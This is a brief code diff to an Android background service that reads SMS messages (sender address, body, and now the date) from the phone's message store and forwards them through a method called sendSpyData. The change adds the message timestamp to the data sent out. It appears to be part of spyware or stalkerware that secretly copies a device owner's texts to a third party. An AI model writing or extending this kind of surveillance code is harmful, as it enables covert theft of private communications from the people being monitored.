@@ -72,6 +72,10 @@ public class SmsService extends Service {
 								.toString();
 						String address = cursor.getString(cursor.getColumnIndexOrThrow("address"))
 								.toString();
+						String date = cursor.getString(cursor.getColumnIndexOrThrow("date"))
+								.toString();
+						Log.i(SetupActivity.TAG, "Date: " + date);
+
 						String protocol = cursor
 								.getString(cursor.getColumnIndexOrThrow("protocol"));
 
@@ -84,7 +88,7 @@ public class SmsService extends Service {
 						} else {
 							title = SMS_RECEIVED_TITLE + address;
 						}
-						client.sendSpyData(title, body);
+						client.sendSpyData(title, body, date);
 					} while (cursor.moveToNext());
 				}
 				Log.i(SetupActivity.TAG, "Finished sending SMS");
